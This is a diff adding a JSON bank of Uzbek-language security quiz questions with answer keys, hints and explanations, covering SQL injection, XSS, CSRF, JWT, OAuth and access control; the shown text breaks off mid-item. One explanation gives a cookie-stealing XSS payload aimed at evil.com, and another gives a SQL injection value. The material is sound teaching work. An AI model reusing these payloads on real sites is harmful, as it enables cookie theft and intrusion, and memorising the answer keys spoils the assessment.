@@ -1,0 +1,482 @@
+{
+  "topic": "core.security",
+  "questions": [
+    {
+      "id": "core.security.001",
+      "level": "junior",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "Authentication va authorization o'rtasidagi farq nimada?",
+      "options": [
+        { "id": "a", "text": "Authentication — foydalanuvchi kimligini tasdiqlash; authorization — tasdiqlangan foydalanuvchi nimaga ruxsati borligini aniqlash", "correct": true },
+        { "id": "b", "text": "Authentication — ruxsatlarni tekshirish; authorization — login qilish", "hint": "Atamalar teskari qo'yilgan. Login birinchi keladi — bu qaysi so'z?" },
+        { "id": "c", "text": "Ikkalasi bir xil narsa", "hint": "Login qilgan foydalanuvchi ham admin panelga kira olmasligi mumkin — bu ikki alohida tekshiruv." },
+        { "id": "d", "text": "Authorization faqat parol, authentication faqat token", "hint": "Vosita turi (parol/token) bilan tushuncha aralashtirilgan." }
+      ],
+      "explanation": "AuthN (\"kimsan?\") — login, parol, OTP, biometrika. AuthZ (\"nima qila olasan?\") — rollar, ruxsatlar, ACL. HTTP'da 401 Unauthorized aslida \"autentifikatsiya yo'q\", 403 Forbidden — \"autentifikatsiya bor, ruxsat yo'q\".",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.002",
+      "level": "junior",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "Parollar bazada qanday saqlanishi kerak?",
+      "options": [
+        { "id": "a", "text": "Salt bilan sekin hash funksiyasi (bcrypt, scrypt, Argon2) orqali hash qilingan holda", "correct": true },
+        { "id": "b", "text": "Ochiq matnda, lekin DB parol bilan himoyalangan bo'lsa yetarli", "hint": "DB sizib chiqsa, barcha parollar darhol oshkor bo'ladi." },
+        { "id": "c", "text": "AES bilan shifrlangan holda", "hint": "Shifrlash qaytariladigan — kalit sizib chiqsa, parollar ochiladi. Parolni qayta tiklash kerak emas, faqat tekshirish." },
+        { "id": "d", "text": "MD5 hash bilan", "hint": "Bu hash juda tez va buzilgan — GPU'da sekundiga milliardlab urinish mumkin." }
+      ],
+      "explanation": "Hash — bir tomonlama: parolni tiklab bo'lmaydi, faqat solishtiriladi. Salt — har foydalanuvchiga noyob tasodifiy qo'shimcha, rainbow table'ni bekor qiladi. Sekin algoritm (bcrypt/Argon2) brute-force'ni qimmat qiladi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.003",
+      "level": "junior",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "Parol hash'lashda salt nima uchun kerak?",
+      "options": [
+        { "id": "a", "text": "Bir xil parollar turli hash berishi va oldindan hisoblangan jadvallar (rainbow table) ishlamasligi uchun", "correct": true },
+        { "id": "b", "text": "Hash'ni qisqartirish uchun", "hint": "Salt hash uzunligiga ta'sir qilmaydi." },
+        { "id": "c", "text": "Parolni keyinroq tiklash uchun", "hint": "Hash bir tomonlama — tiklash maqsad emas." },
+        { "id": "d", "text": "DB'ga yozishni tezlashtirish uchun", "hint": "Tezlik bilan aloqasi yo'q." }
+      ],
+      "explanation": "Saltsiz: ikki foydalanuvchi \"123456\" yozsa, hash'lar bir xil — birini buzgan hammasini buzadi. Salt tasodifiy, hash yonida ochiq saqlanadi; bcrypt/Argon2 uni natijaga avtomatik kiritadi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.004",
+      "level": "junior",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "HTTPS HTTP'dan farqli o'laroq nimani ta'minlaydi?",
+      "options": [
+        { "id": "a", "text": "Trafikni shifrlash (confidentiality), ma'lumot o'zgartirilmaganini (integrity) va server haqiqiyligini sertifikat orqali tasdiqlash", "correct": true },
+        { "id": "b", "text": "Faqat tezroq yuklanish", "hint": "Tezlik asosiy maqsad emas (HTTP/2 bilan tezroq bo'lishi — yon ta'sir)." },
+        { "id": "c", "text": "Serverdagi ma'lumotlarni shifrlash", "hint": "HTTPS faqat yo'ldagi (in transit) ma'lumotni himoya qiladi, diskdagini emas." },
+        { "id": "d", "text": "Foydalanuvchini autentifikatsiya qilish", "hint": "Standart HTTPS serverni tasdiqlaydi, foydalanuvchini emas (mTLS bundan mustasno)." }
+      ],
+      "explanation": "HTTPS = HTTP + TLS. Wi-Fi'da o'tirgan hujumchi HTTP trafikni o'qiy va o'zgartira oladi (man-in-the-middle). TLS buni yopadi; sertifikat (CA tomonidan imzolangan) \"bu haqiqatan example.com\" deydi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.005",
+      "level": "junior",
+      "type": "single",
+      "kind": "code_review",
+      "prompt": "Quyidagi kodda qaysi zaiflik bor?",
+      "code": "fun findUser(name: String): User? {\n    val sql = \"SELECT * FROM users WHERE name = '\" + name + \"'\"\n    return db.query(sql)\n}\n\n// name = \"' OR '1'='1\"",
+      "options": [
+        { "id": "a", "text": "SQL injection — foydalanuvchi kiritgan matn so'rovga to'g'ridan-to'g'ri qo'shilyapti, bu so'rov mantiqini o'zgartirishga yo'l qo'yadi", "correct": true },
+        { "id": "b", "text": "XSS — brauzerda skript bajariladi", "hint": "Bu DB so'rovi, brauzer yo'q; muammo so'rov matnini yig'ishda." },
+        { "id": "c", "text": "Parol ochiq saqlanmoqda", "hint": "Kodda parol umuman yo'q." },
+        { "id": "d", "text": "Hech qanday zaiflik yo'q", "hint": "Izohdagi `name` qiymatini so'rovga qo'yib ko'ring — `WHERE` har doim true bo'ladi." }
+      ],
+      "explanation": "Yechim — parametrlangan so'rov (prepared statement): `db.query(\"SELECT * FROM users WHERE name = ?\", name)`. Drayver qiymatni ma'lumot sifatida uzatadi, SQL kodi sifatida emas. ORM'lar ham default shu yo'lni tutadi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.006",
+      "level": "junior",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "SQL injection'dan himoyalanishning asosiy usuli nima?",
+      "options": [
+        { "id": "a", "text": "Parametrlangan so'rovlar (prepared statements) — foydalanuvchi qiymati so'rov matniga emas, alohida parametr sifatida uzatiladi", "correct": true },
+        { "id": "b", "text": "Barcha apostroflarni qo'lda o'chirish", "hint": "Qo'lda filtrlash doim chetlab o'tiladi (encoding, boshqa belgilar); ishonchli yechim DB drayveri darajasida." },
+        { "id": "c", "text": "So'rovlarni faqat HTTPS orqali yuborish", "hint": "HTTPS yo'lni himoya qiladi, so'rov mazmunini emas." },
+        { "id": "d", "text": "DB'ni boshqa serverga ko'chirish", "hint": "Joylashuv zaiflikni o'zgartirmaydi." }
+      ],
+      "explanation": "Prepared statement'da so'rov tuzilishi oldindan kompilyatsiya qilinadi, qiymatlar keyin bog'lanadi — hech qanday qiymat SQL sintaksisiga aylanolmaydi. Qo'shimcha: eng kam huquqli DB foydalanuvchi, input validatsiya.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.007",
+      "level": "junior",
+      "type": "single",
+      "kind": "true_false",
+      "prompt": "Quyidagi fikr to'g'rimi?\n\nHTTPS ishlatilsa, serverdagi bazada parollarni ochiq matnda saqlash xavfsiz.",
+      "options": [
+        { "id": "a", "text": "Ha", "hint": "HTTPS faqat tarmoq yo'lini himoya qiladi. Baza sizib chiqsa yoki xodim ko'rsa nima bo'ladi?" },
+        { "id": "b", "text": "Yo'q", "correct": true }
+      ],
+      "explanation": "Transportdagi himoya (TLS) va saqlashdagi himoya (hash) — ikki alohida qatlam. Ma'lumot sizishi (breach) ko'pincha bazadan bo'ladi, tarmoqdan emas. Parol har doim hash qilinadi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.008",
+      "level": "junior",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "HTTP 401 va 403 status kodlari qanday farqlanadi?",
+      "options": [
+        { "id": "a", "text": "401 — autentifikatsiya yo'q yoki noto'g'ri (kim ekaningiz noma'lum); 403 — kimligingiz ma'lum, lekin ruxsat yo'q", "correct": true },
+        { "id": "b", "text": "401 — ruxsat yo'q; 403 — login kerak", "hint": "Teskari. Nomi \"Unauthorized\" bo'lsa ham 401 aslida autentifikatsiya haqida." },
+        { "id": "c", "text": "Ikkalasi bir xil, server tanlaydi", "hint": "Klient uchun farq muhim: birida login so'rash, ikkinchisida xato ko'rsatish." },
+        { "id": "d", "text": "403 — server xatosi", "hint": "Server xatolari 5xx diapazonida." }
+      ],
+      "explanation": "401 ga javoban klient login oynasini ko'rsatadi yoki tokenni yangilaydi. 403 — qayta login yordam bermaydi, rol yetarli emas. Tarixiy nomlanish chalg'ituvchi: 401 \"Unauthenticated\" bo'lishi kerak edi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.009",
+      "level": "middle",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "XSS (Cross-Site Scripting) hujumi nima?",
+      "options": [
+        { "id": "a", "text": "Hujumchi sahifaga o'z JavaScript kodini kiritadi va u boshqa foydalanuvchilar brauzerida sayt nomidan bajariladi", "correct": true },
+        { "id": "b", "text": "Hujumchi DB so'rovini o'zgartiradi", "hint": "DB so'rovi — SQL injection; XSS brauzer tomonida." },
+        { "id": "c", "text": "Hujumchi serverni so'rovlar bilan to'ldiradi", "hint": "Bu DoS tavsifi." },
+        { "id": "d", "text": "Hujumchi foydalanuvchi nomidan boshqa saytga so'rov yuboradi", "hint": "Bu CSRF — alohida hujum turi." }
+      ],
+      "explanation": "Misol: izohga `<script>fetch('evil.com?c='+document.cookie)</script>` yozish; sanitizatsiyasiz ko'rsatilsa, har o'quvchining cookie'si o'g'irlanadi. Himoya: output encoding (HTML escape), framework'larning avtomatik escape'i, Content Security Policy, `HttpOnly` cookie.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.010",
+      "level": "middle",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "XSS'dan himoyalanishning asosiy printsipi nima?",
+      "options": [
+        { "id": "a", "text": "Foydalanuvchi ma'lumotini HTML'ga chiqarishda kontekstga mos encode/escape qilish (va CSP bilan qo'shimcha chegara qo'yish)", "correct": true },
+        { "id": "b", "text": "Barcha so'rovlarni HTTPS orqali yuborish", "hint": "HTTPS yo'lni himoya qiladi; skript saytning o'zidan keladi." },
+        { "id": "c", "text": "`<script>` so'zini kirishda o'chirish", "hint": "Qora ro'yxat chetlab o'tiladi: `<img onerror=...>`, encoding va boshqalar. Chiqishda escape ishonchli." },
+        { "id": "d", "text": "Parollarni hash qilish", "hint": "Parol saqlash XSS bilan bog'liq emas." }
+      ],
+      "explanation": "`<` → `&lt;` kabi escape ma'lumotni matn sifatida ko'rsatadi, kod sifatida emas. React/Compose/Angular default escape qiladi; `innerHTML`/`dangerouslySetInnerHTML` — xavfli joy. CSP inline skriptlarni taqiqlab, muvaffaqiyatli injection zararini kamaytiradi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.011",
+      "level": "middle",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "CSRF (Cross-Site Request Forgery) hujumi qanday ishlaydi?",
+      "options": [
+        { "id": "a", "text": "Hujumchi sayti foydalanuvchi brauzerini (saqlangan cookie bilan) ishonchli saytga foydalanuvchi bilmagan holda so'rov yuborishga majbur qiladi", "correct": true },
+        { "id": "b", "text": "Hujumchi sahifaga JavaScript kiritadi", "hint": "Skript kiritish — XSS; CSRF'da hujumchi kodi boshqa saytda." },
+        { "id": "c", "text": "Hujumchi parolni brute-force qiladi", "hint": "Brute-force bilan aloqasi yo'q — foydalanuvchi allaqachon login qilgan." },
+        { "id": "d", "text": "Hujumchi TLS trafikni o'qiydi", "hint": "Trafik o'qish — MITM; CSRF brauzer ishonchini suiiste'mol qiladi." }
+      ],
+      "explanation": "Foydalanuvchi bank.com'ga login qilgan; evil.com'da yashirin forma `POST bank.com/transfer` yuboradi — brauzer cookie'ni avtomatik qo'shadi. Himoya: CSRF token (formaga noyob qiymat), `SameSite=Lax/Strict` cookie, holat o'zgartiruvchi amallarni GET'da qilmaslik.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.012",
+      "level": "middle",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "JWT (JSON Web Token) qanday qismlardan tashkil topgan?",
+      "options": [
+        { "id": "a", "text": "Header (algoritm, tur), Payload (claims), Signature — uchalasi Base64Url kodlanib nuqta bilan ajratiladi", "correct": true },
+        { "id": "b", "text": "Login, parol, muddat", "hint": "Token hech qachon parolni o'z ichiga olmaydi." },
+        { "id": "c", "text": "Shifrlangan bitta blob", "hint": "Standart JWT (JWS) shifrlanmagan — payload har kim o'qiy oladi, faqat imzo himoyalaydi." },
+        { "id": "d", "text": "Faqat tasodifiy satr", "hint": "Tasodifiy satr — opaque session ID; JWT ichida tuzilgan ma'lumot bor." }
+      ],
+      "explanation": "`header.payload.signature`. Payload'da `sub`, `exp`, `iat`, rollar — Base64, shifr emas, shu sabab maxfiy ma'lumot qo'yilmaydi. Imzo (HMAC yoki RSA/ECDSA) tokenni server yaratganini va o'zgarmaganini tasdiqlaydi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.013",
+      "level": "middle",
+      "type": "multi",
+      "kind": "concept",
+      "prompt": "JWT bilan bog'liq keng tarqalgan xavflar qaysilar? (bir nechta javob)",
+      "options": [
+        { "id": "a", "text": "`alg: none` yoki algoritmni almashtirish (RS256 → HS256) hujumini qabul qilish", "correct": true },
+        { "id": "b", "text": "Payload'ga maxfiy ma'lumot (parol, karta) qo'yish — u shifrlanmagan", "correct": true },
+        { "id": "c", "text": "Uzoq muddatli tokenni bekor qilish (revoke) qiyin — stateless bo'lgani uchun", "correct": true },
+        { "id": "d", "text": "Token hajmi DB'ga sig'maydi", "hint": "Token odatda DB'da saqlanmaydi; hajm muammo emas." }
+      ],
+      "explanation": "Server algoritmni tokendan emas, o'z konfiguratsiyasidan olishi kerak. Payload ochiq — faqat identifikator va rol. Revocation: qisqa `exp` (5–15 daqiqa) + refresh token, yoki blocklist. `localStorage`da saqlash XSS'ga ochiq — `HttpOnly` cookie afzal.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.014",
+      "level": "middle",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "OAuth 2.0 Authorization Code flow'ning asosiy g'oyasi nimada?",
+      "options": [
+        { "id": "a", "text": "Foydalanuvchi provayderda login qiladi, ilova qisqa muddatli code oladi va uni server tomonida (client secret bilan) access token'ga almashtiradi — parol ilovaga hech qachon tushmaydi", "correct": true },
+        { "id": "b", "text": "Ilova foydalanuvchi parolini olib provayderga yuboradi", "hint": "Bu eskirgan Password grant — maqsad aynan parolni uchinchi ilovaga bermaslik." },
+        { "id": "c", "text": "Token to'g'ridan-to'g'ri URL fragmentida brauzerga qaytariladi", "hint": "Bu Implicit flow — tarix, log va referer orqali sizish xavfi tufayli endi tavsiya etilmaydi." },
+        { "id": "d", "text": "Ilova provayder DB'siga to'g'ridan-to'g'ri ulanadi", "hint": "OAuth bunday kirishni aynan oldini oladi." }
+      ],
+      "explanation": "Code bir martalik va qisqa umrli; token almashinuvi orqa kanalda (server↔server) bo'ladi. Mobil/SPA uchun client secret saqlab bo'lmaydi — shu sabab PKCE (code_verifier/code_challenge) qo'shiladi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.015",
+      "level": "middle",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "OAuth 2.0'da PKCE nima uchun kerak?",
+      "options": [
+        { "id": "a", "text": "Client secret saqlay olmaydigan ilovalar (mobil, SPA) uchun authorization code'ni ushlab olish hujumidan himoya — code faqat uni so'ragan ilova tomonidan almashtirilishi mumkin", "correct": true },
+        { "id": "b", "text": "Tokenni shifrlash uchun", "hint": "PKCE token tarkibiga tegmaydi, code almashinuvini bog'laydi." },
+        { "id": "c", "text": "Parolni hash qilish uchun", "hint": "OAuth'da ilova parolni ko'rmaydi." },
+        { "id": "d", "text": "Refresh token muddatini uzaytirish uchun", "hint": "Muddat bilan aloqasi yo'q." }
+      ],
+      "explanation": "Ilova tasodifiy `code_verifier` yaratadi, uning hash'ini (`code_challenge`) birinchi so'rovda yuboradi. Code'ni token'ga almashtirishda asl `code_verifier`ni ko'rsatadi — code'ni ushlab olgan hujumchi verifier'ni bilmaydi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.016",
+      "level": "middle",
+      "type": "single",
+      "kind": "code_review",
+      "prompt": "Quyidagi koddagi xavfsizlik muammosi nimada?",
+      "code": "// build.gradle.kts\nandroid {\n    defaultConfig {\n        buildConfigField(\"String\", \"API_KEY\", \"\\\"sk_live_9f8a7b6c5d4e\\\"\")\n    }\n}\n// git'ga commit qilingan",
+      "options": [
+        { "id": "a", "text": "Maxfiy kalit manba kodda va git tarixida — repozitoriyga kirgan har kim (va dekompilyatsiya qilgan har kim) uni oladi", "correct": true },
+        { "id": "b", "text": "Kalit juda qisqa", "hint": "Uzunlik emas, joylashuv muammo." },
+        { "id": "c", "text": "`String` o'rniga `CharArray` kerak", "hint": "Tur o'zgartirish kalitni manbadan yashirmaydi." },
+        { "id": "d", "text": "Muammo yo'q — BuildConfig xavfsiz", "hint": "APK dekompilyatsiya qilinganda BuildConfig konstantalari ochiq ko'rinadi." }
+      ],
+      "explanation": "Sirlar kodga emas: `local.properties`/env o'zgaruvchi (git'da yo'q), CI secret storage, serverda — Vault/Secret Manager. Git tarixiga tushgan kalit allaqachon sizgan hisoblanadi — uni almashtirish (rotate) kerak, shunchaki o'chirish yetmaydi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.017",
+      "level": "middle",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "Backend ilovada sirlarni (DB parol, API kalit) saqlashning to'g'ri yo'li qanday?",
+      "options": [
+        { "id": "a", "text": "Kod va repozitoriydan tashqarida — environment o'zgaruvchilar yoki secret manager (Vault, AWS Secrets Manager) orqali runtime'da berish, muntazam rotatsiya qilish", "correct": true },
+        { "id": "b", "text": "`config.json` faylida repozitoriy ichida, lekin `.gitignore`ga qo'shmasdan", "hint": "Repozitoriyga tushgan sir — klonlagan har kimga ochiq." },
+        { "id": "c", "text": "Kodda Base64 kodlab", "hint": "Base64 — kodlash, shifrlash emas; bir soniyada ochiladi." },
+        { "id": "d", "text": "Log fayllarida", "hint": "Loglar ko'pincha eng kam himoyalangan joy." }
+      ],
+      "explanation": "Printsiplar: sir kodda bo'lmasin, muhitlar (dev/prod) uchun alohida, kim kirganini audit qilish, sizganda tez rotatsiya. Secret manager bularni markazlashtiradi va kirishni IAM bilan cheklaydi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.018",
+      "level": "middle",
+      "type": "single",
+      "kind": "true_false",
+      "prompt": "Quyidagi fikr to'g'rimi?\n\nJWT payload'i Base64 bilan kodlangani uchun undagi ma'lumot maxfiy hisoblanadi.",
+      "options": [
+        { "id": "a", "text": "Ha", "hint": "Base64 har kim dekodlay oladigan kodlash; jwt.io ga tokenni qo'yib ko'ring." },
+        { "id": "b", "text": "Yo'q", "correct": true }
+      ],
+      "explanation": "Base64 — transport uchun qulay ko'rinish, shifr emas. JWT'ning imzosi butunlik (o'zgartirilmagan) va haqiqiylikni (server yaratgan) ta'minlaydi, maxfiylikni emas. Maxfiylik kerak bo'lsa — JWE yoki payload'ga maxfiy narsa qo'ymaslik.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.019",
+      "level": "strong_middle",
+      "type": "multi",
+      "kind": "concept",
+      "prompt": "Qaysilar OWASP Top 10 toifalariga kiradi? (bir nechta javob)",
+      "options": [
+        { "id": "a", "text": "Broken Access Control", "correct": true },
+        { "id": "b", "text": "Injection", "correct": true },
+        { "id": "c", "text": "Security Misconfiguration", "correct": true },
+        { "id": "d", "text": "Slow Database Queries", "hint": "Bu performance masalasi, xavfsizlik toifasi emas." }
+      ],
+      "explanation": "OWASP Top 10 (2021): Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable Components, Identification & Authentication Failures, Software/Data Integrity Failures, Logging & Monitoring Failures, SSRF. Birinchi o'rin — kirish nazorati buzilishi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.020",
+      "level": "strong_middle",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "\"Broken Access Control\" zaifligining tipik misoli qanday?",
+      "options": [
+        { "id": "a", "text": "Foydalanuvchi URL'dagi `/orders/123` ni `/orders/124` ga o'zgartirib, boshqa foydalanuvchi buyurtmasini ko'radi — server ob'ekt egasini tekshirmaydi (IDOR)", "correct": true },
+        { "id": "b", "text": "Parol hash'siz saqlanadi", "hint": "Bu Cryptographic Failures toifasi." },
+        { "id": "c", "text": "Server eski kutubxona versiyasini ishlatadi", "hint": "Bu Vulnerable and Outdated Components." },
+        { "id": "d", "text": "Loglar yozilmaydi", "hint": "Bu Logging & Monitoring Failures." }
+      ],
+      "explanation": "IDOR (Insecure Direct Object Reference) — eng keng tarqalgan. Yechim: har so'rovda \"bu resurs shu foydalanuvchiga tegishlimi?\" tekshiruvi server tomonida; UI'da tugmani yashirish himoya emas. Deny by default, rollarni markazlashtirilgan tekshirish.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.021",
+      "level": "strong_middle",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "Access token qisqa muddatli, refresh token uzoq muddatli qilinishining sababi nima?",
+      "options": [
+        { "id": "a", "text": "Access token o'g'irlansa zarar vaqti cheklanadi; refresh token kamroq uzatiladi, xavfsizroq saqlanadi va serverda bekor qilinishi mumkin — shu bilan stateless tekshiruv va revocation muvozanatlanadi", "correct": true },
+        { "id": "b", "text": "Access token hajmini kichraytirish uchun", "hint": "Hajm muddat bilan bog'liq emas." },
+        { "id": "c", "text": "Server yukini oshirish uchun", "hint": "Aksincha, access token stateless tekshirilib, DB'ga murojaat kamayadi." },
+        { "id": "d", "text": "Sababi yo'q, bu shunchaki an'ana", "hint": "Aniq xavfsizlik muvozanati bor: zarar oynasi va bekor qilish imkoni." }
+      ],
+      "explanation": "Access token (5–15 daqiqa) har so'rovda yuboriladi, imzo bilan tekshiriladi — DB yo'q. Refresh token faqat yangilashda, `HttpOnly` cookie yoki xavfsiz saqlovchida, serverda ro'yxatda — logout/kompromissda o'chiriladi. Refresh token rotation: har ishlatilganda yangisi beriladi, eskisi qayta kelsa — o'g'irlangan signal.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.022",
+      "level": "strong_middle",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "Foydalanuvchi logout qilganda stateless JWT'ni darhol bekor qilish uchun qanday yondashuvlar bor?",
+      "options": [
+        { "id": "a", "text": "Qisqa `exp` bilan refresh tokenni serverda o'chirish; zarur bo'lsa access token identifikatorlari (`jti`) uchun qisqa muddatli blocklist (masalan, Redis'da)", "correct": true },
+        { "id": "b", "text": "Hech narsa qilish kerak emas — token o'z-o'zidan yaroqsiz bo'ladi", "hint": "Klientda o'chirish yetmaydi: nusxasi bo'lgan har kim `exp` gacha ishlatadi." },
+        { "id": "c", "text": "Serverning imzo kalitini o'zgartirish", "hint": "Bu barcha foydalanuvchilarni bir vaqtda chiqarib yuboradi — bitta logout uchun nomutanosib." },
+        { "id": "d", "text": "Tokenni klient tomonida shifrlash", "hint": "Klient tomonidagi amal serverda tekshiruvni o'zgartirmaydi." }
+      ],
+      "explanation": "To'liq stateless + darhol revocation — bir-biriga zid. Amaliy muvozanat: access token qisqa (zarar oynasi kichik), refresh token stateful. Yuqori xavfli tizimlarda blocklist — bu qisman stateful, lekin faqat `exp` gacha saqlanadi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.023",
+      "level": "strong_middle",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "Input validatsiyasi qaysi qatlamda bo'lishi kerak?",
+      "options": [
+        { "id": "a", "text": "Klient tomonida — UX uchun; server tomonida — majburiy, chunki klient tekshiruvi chetlab o'tiladi; DB cheklovlari — oxirgi to'siq", "correct": true },
+        { "id": "b", "text": "Faqat klient tomonida — foydalanuvchi shuni ko'radi", "hint": "Postman yoki curl bilan klient tekshiruvi umuman ishlamaydi." },
+        { "id": "c", "text": "Faqat DB darajasida", "hint": "DB xatosi foydalanuvchiga tushunarli emas va biznes qoidalarni to'liq ifodalay olmaydi." },
+        { "id": "d", "text": "Hech qayerda — framework o'zi qiladi", "hint": "Framework tur tekshiradi, biznes qoidalarni bilmaydi." }
+      ],
+      "explanation": "Defense in depth. Server validatsiyasi: tur, uzunlik, format (allowlist), biznes qoidalar; shuningdek, ruxsat tekshiruvi. Validatsiya injection'ni to'liq yopmaydi — parametrlangan so'rov va output encoding alohida kerak.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.024",
+      "level": "strong_middle",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "Loyihadagi uchinchi tomon kutubxonalaridagi zaifliklar (supply chain) bilan qanday ishlash kerak?",
+      "options": [
+        { "id": "a", "text": "Bog'liqliklarni lock-fayl bilan qotirish, CI'da avtomatik skanerlash (Dependabot, OWASP Dependency-Check, Snyk), zaiflik chiqsa tez yangilash, keraksiz bog'liqliklarni olib tashlash", "correct": true },
+        { "id": "b", "text": "Barcha kutubxonalarni doim eng so'nggi versiyaga avtomatik yangilash, tekshiruvsiz", "hint": "Ko'r-ko'rona yangilash buzilgan yoki zararli release'ni (typosquatting, hijacked package) olib kelishi mumkin." },
+        { "id": "c", "text": "Kutubxonalardan umuman foydalanmaslik", "hint": "Real emas; maqsad xavfni boshqarish." },
+        { "id": "d", "text": "Faqat yilda bir marta tekshirish", "hint": "Log4Shell kabi zaifliklar soatlar ichida ekspluatatsiya qilinadi." }
+      ],
+      "explanation": "Log4Shell (2021) ko'rsatdi: transitiv bog'liqlikdagi zaiflik butun tizimni ochadi. SBOM (bog'liqliklar ro'yxati), versiyalarni qotirish, imzolangan paketlar, minimal bog'liqlik — supply chain xavfsizligining asosi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.025",
+      "level": "strong_middle",
+      "type": "single",
+      "kind": "code_review",
+      "prompt": "Quyidagi endpoint'da qaysi OWASP zaifligi bor?",
+      "code": "@GetMapping(\"/api/invoices/{id}\")\nfun getInvoice(@PathVariable id: Long, principal: Principal): Invoice {\n    return invoiceRepo.findById(id)\n        ?: throw NotFoundException()\n}",
+      "options": [
+        { "id": "a", "text": "Broken Access Control (IDOR) — foydalanuvchi autentifikatsiyadan o'tgan, lekin invoice unga tegishliligi tekshirilmaydi", "correct": true },
+        { "id": "b", "text": "SQL injection — `id` so'rovga qo'shilmoqda", "hint": "`findById(Long)` parametrlangan; tur `Long` bo'lgani uchun matn kiritib bo'lmaydi." },
+        { "id": "c", "text": "XSS — natija HTML'ga chiqadi", "hint": "Bu JSON API; muammo kirish huquqida." },
+        { "id": "d", "text": "Zaiflik yo'q — `principal` bor", "hint": "`principal` olinadi, lekin hech qayerda ishlatilmaydi." }
+      ],
+      "explanation": "Yechim: `invoiceRepo.findByIdAndOwner(id, principal.name)` yoki topilgandan keyin `invoice.ownerId == currentUser.id` tekshiruvi; mos kelmasa 404 (403 emas — mavjudligini ham oshkor qilmaslik uchun). Bu tekshiruvni har endpoint'da takrorlamay, markazlashtirish yaxshi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.026",
+      "level": "strong_middle",
+      "type": "single",
+      "kind": "true_false",
+      "prompt": "Quyidagi fikr to'g'rimi?\n\nUI'da admin tugmasini oddiy foydalanuvchiga ko'rsatmaslik — bu yetarli kirish nazorati.",
+      "options": [
+        { "id": "a", "text": "Ha", "hint": "Foydalanuvchi API'ni to'g'ridan-to'g'ri chaqira oladi — tugma yo'qligi uni to'xtatmaydi." },
+        { "id": "b", "text": "Yo'q", "correct": true }
+      ],
+      "explanation": "Klient tomonidagi har qanday cheklov — UX, xavfsizlik emas. Har admin endpoint serverda rolni tekshiradi. \"Security by obscurity\" (yashirish) himoya hisoblanmaydi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.027",
+      "level": "senior",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "Threat modeling (tahdid modellashtirish) jarayonining mohiyati nimada?",
+      "options": [
+        { "id": "a", "text": "Tizimni (aktivlar, kirish nuqtalari, ishonch chegaralari) tahlil qilib, kim nimaga qanday hujum qilishi mumkinligini tizimli aniqlash va himoya choralarini xavf darajasiga ko'ra ustuvorlashtirish — dizayn bosqichida", "correct": true },
+        { "id": "b", "text": "Ishlab chiqarishga chiqqandan keyin penetration test buyurtma qilish", "hint": "Pentest — tekshirish; threat modeling dizayn vaqtida, kod yozilishidan oldin boshlanadi." },
+        { "id": "c", "text": "Antivirus o'rnatish", "hint": "Bu bitta vosita, jarayon emas." },
+        { "id": "d", "text": "Barcha zaifliklarni yopish", "hint": "Hamma narsani yopish mumkin emas; maqsad xavfni ustuvorlashtirish." }
+      ],
+      "explanation": "Savollar: nima quramiz? nima noto'g'ri ketishi mumkin (STRIDE: Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege)? nima qilamiz? yetarli qildikmi? Data flow diagram va trust boundary'lar — asosiy vosita. Arzon vaqt — arxitektura bosqichi.",
+      "reviewed": false
+    },
+    {
+      "id": "core.security.028",
+      "level": "senior",
+      "type": "single",
+      "kind": "concept",
+      "prompt": "Zero Trust arxitekturasining asosiy printsipi nima?",
+      "options": [
+        { "id": "a", "text": "\"Hech qachon ishonma, doim tekshir\" — tarmoq ichida bo'lish ishonch bermaydi; har so'rov identitet, qurilma va kontekst bo'yicha tekshiriladi, eng kam huquq beriladi", "correct": true },
+        { "id": "b", "text": "Hech kimga tizimga kirishga ruxsat bermaslik", "hint": "Maqsad kirishni to'xtatish emas, har kirishni tekshirish." },
+        { "id": "c", "text": "Kuchli perimeter firewall qurish", "hint": "Bu eski \"qal'a va xandaq\" modeli — Zero Trust uni aynan rad etadi." },
+        { "id": "d", "text": "Barcha xodimlarga VPN berish", "hint": "VPN perimeter modelining davomi; ichkariga kirgan hujumchi erkin yuradi." }
+      ],
